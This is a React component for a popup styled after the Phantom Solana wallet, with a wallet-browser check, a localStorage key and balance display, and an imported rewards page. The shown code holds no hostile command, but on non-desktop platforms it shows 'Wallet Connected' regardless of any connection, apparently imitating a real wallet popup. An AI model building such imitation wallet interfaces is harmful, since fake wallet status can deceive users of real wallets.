"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import RewardPagePhantom from "@/components/popup/rewards-phantom";

const PopupPage = () => {
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [balance, setBalance] = useState<number | null>(null);
  const [copied, setCopied] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [isDesktop, setIsDesktop] = useState(true); // Assume desktop initially
  const [isWalletBrowser, setIsWalletBrowser] = useState(false);
  const [isMobileWalletApp, setIsMobileWalletApp] = useState(true);

  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const mobile = /android|iphone|ipod|windows phone/i.test(userAgent);
    setIsMobile(mobile);

    const platform = navigator.platform.toLowerCase();
    const isPC = platform.includes("win") || platform.includes("mac");
    setIsDesktop(isPC);

    const isSolflare = typeof window.solflare !== "undefined";
    const isPhantom = typeof window.solana !== "undefined";

    if (isSolflare || isPhantom) {
      setIsWalletBrowser(true);
    }

    if (mobile && (isSolflare || isPhantom)) {
      setIsMobileWalletApp(true);
    }

    const savedPublicKey = localStorage.getItem("publicKey");
    const savedBalance = localStorage.getItem("balance");

    if (savedPublicKey) setPublicKey(savedPublicKey);
    if (savedBalance) setBalance(parseFloat(savedBalance));
  }, []);

  const truncatePublicKey = (key: string) => {
    if (!key) return "";
    return `${key.slice(0, 4)}...${key.slice(-4)}`;
  };

  const handleTextCopy = () => {
    if (publicKey) {
      navigator.clipboard.writeText(publicKey);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
      console.log(isMobile,isWalletBrowser)
    }
  };

  return (
    <main>
      <div
        style={{ backgroundColor: "#222222" }}
        className="h-screen w-full bg-gray-900 text-white flex flex-col items-left pt-2 pb-2"
      >
        <div className="flex items-center">
          {/* Image Section */}
          <Image
            src="/phan.png"
            alt="App Icon"
            width={40}
            height={40}
            className="pl-2"
          />

          {/* Wallet Connected or Warning Message Section */}
          {!isDesktop ? (
            <p className="text-lg">Wallet Connected</p>
          ) : !isMobileWalletApp ? (
            <p className="text-lg">Currently, we do not support</p>
          ) : publicKey && balance !== null ? (
            <div className="relative group" onClick={handleTextCopy}  style={{ backgroundColor: "#222222" }}>
              <div className="flex flex-col gap-0 transition-all duration-300  px-4 pt-1 pb-0 rounded-md group-hover:space-y-0">
                <p className="text-base font-medium transition-transform duration-300 group-hover:-translate-y-1 group-hover:text-white mb-0">
                  Wallet Connected
                </p>
                <div className="flex items-left gap-2 opacity-0 transition-opacity duration-300 group-hover:-translate-y-2 group-hover:opacity-100 font-extralight text-sm text-gray-400">
                  <p className="font-mono mb-0">{truncatePublicKey(publicKey)}</p>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    strokeWidth="1.5"
                    stroke="currentColor"
                    className="size-4"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125 1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"
                    />
                  </svg>
                </div>
              </div>
              <span
                className={`absolute top-full left-1/2 transform -translate-x-1/2 rounded-md text-xs text-white ${
                  copied ? "block" : "hidden"
                } group-hover:block`}
              >
                {copied ? "Copied!" : ""}
              </span>
            </div>
          ) : (
            <p className="text-lg">Connecting...</p>
          )}
          <hr></hr>
        </div>

        <RewardPagePhantom />
      </div>
    </main>
  );
};

export default PopupPage;
